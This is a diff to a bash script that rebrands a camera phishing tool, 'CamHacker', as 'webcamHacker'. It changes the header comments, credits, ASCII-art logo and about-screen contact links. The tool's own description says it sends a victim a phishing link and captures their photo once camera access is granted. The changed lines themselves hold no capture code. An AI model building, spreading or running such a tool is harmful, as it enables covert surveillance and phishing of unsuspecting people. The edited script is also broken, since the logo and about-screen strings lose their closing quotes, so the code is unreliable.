@@ -1,16 +1,14 @@
 #!/bin/bash
 
-# CamHacker
+# webcamHacker
 # Version    : 1.1
-# Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : KasRoudra
-# Github     : https://github.com/KasRoudra
-# Email      : kasroudrakrd@gmail.com
-# Credits    : Noob-Hackers, TechChipNet, LinuxChoice
-# Date       : 5-09-2021
+# Description: webcamHacker is a powerful camera Phishing tool. 
+# Date       : 1-12-2021
 # Language   : Shell
 # Portable File
-# If you copy, consider giving credit! We keep our code open source to help others
+# If you copy, consider giving credit! 
+# Credits    :KasRoudra,Noob-Hackers,LinuxChoice
+# This Originally designed by Noob-Hackers,We rebuild it all credit goes them
 
 black="\033[1;30m"
 red="\033[1;31m"
@@ -100,14 +98,35 @@ pacin(){
 
 
 logo="
-${green}  ____                _   _            _
-${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
-${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
-${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
-${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
-${red}                                            [v1.1]
-${blue}                                    [By KasRoudra]
-"
+                     ████████████████                                    
+                              ██████░░░░░░░░░░░░░░░░██████                              
+░░      ░░      ░░          ██░░░░░░                ░░░░░░██              ░░      ░░  ░░
+                      ░░  ██░░                            ░░██    ░░                    
+                        ██░░                                ░░██                        
+                        ██    ██████                ██████    ██                        
+                        ██  ░░░░░░░░████        ████░░░░░░░░  ██                        
+                        ██          ░░████    ████░░          ██                        
+                        ██            ░░░░    ░░░░            ██                        
+                        ██░░  ░░██████░░░░    ░░░░██████░░  ░░██                        
+                        ██░░░░██████████░░    ░░██████████░░░░██                        
+                        ██░░  ░░░░░░░░  ░░    ░░  ░░░░░░░░  ░░██                        
+                        ██              ░░    ░░              ██                        
+                        ██  ░░░░░░      ░░    ░░      ░░░░░░  ██                        
+                        ██  ░░░░░░    ░░        ░░    ░░░░░░  ██                        
+                        ██░░          ░░        ░░          ░░██                        
+                        ██░░░░██        ██░░░░██        ██░░░░██                        
+                        ██░░  ██████░░████████████░░██████  ░░██                        
+                        ██  ░░  ██████████    ██████████  ░░  ██                        
+                          ██  ░░░░    ░░░░░░░░░░░░    ░░░░  ██                          
+                          ██      ░░                ░░      ██                          
+                            ██  ░░  ░░░░░░████░░░░░░  ░░  ██                            
+                            ██░░  ░░      ████      ░░  ░░██                            
+                              ██░░      ░░████░░      ░░██                              
+                                ██░░    ░░████░░    ░░██                                
+                                  ██░░░░  ████  ░░░░██                                  
+                                    ████░░████░░████                                    
+                                        ████████                                        
+░░░░░░░░░░░░░░  ░░░░░░░░░░░░░░░░░░░░░░  ░░▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░                            
 
 killer() {
 if [ `pidof php > /dev/null 2>&1` ]; then
@@ -401,14 +420,14 @@ read option
     elif echo $option | grep -q "x"; then
         clear
         echo -e "$logo"
-        echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
-$red[Version]    ${cyan} :[1.1]
-$red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[KasRoudra]
-$red[Github]     ${cyan} :[https://github.com/KasRoudra] 
-$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
-$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
-printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        echo -e "$red[ToolName]  ${cyan}  :[webcamHacker]
+$red[Version]    ${cyan} :[1.5]
+$red[Description]${cyan} :[camera Phishing tool]
+$red[Author]     ${cyan} :[Anonymous,KasRoudra]
+$red[Github]     ${cyan} :[https://github.com/Letmehackyou011] 
+$red[Messenger]  ${cyan} :[https://t.me/joinchat/WYOKxsmb1B8wYjU1]
+$blue[Facebook]  ${cyan} :[https://www.facebook.com/groups/858193224892142/?ref=share]
+printf "${cyan}\nwebcam${nc}@${cyan}Hacker ${red}$ ${nc}"
 read about
     elif echo $option | grep -q "m"; then
         xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
